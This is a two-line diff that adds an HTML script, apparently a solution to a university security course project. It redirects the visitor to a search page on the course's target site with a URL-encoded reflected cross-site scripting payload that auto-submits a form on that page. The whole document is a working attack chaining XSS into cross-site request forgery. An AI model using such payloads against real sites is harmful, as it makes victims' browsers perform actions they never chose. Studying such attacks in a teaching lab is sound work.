@@ -1,0 +1,2 @@
+<script>location.href="https://csci3403.com/proj3/search?q=%3Cscript%3Edocument.forms%5B1%5D.submit%28%29%3B%3C%2Fscript%3E"
+</script>
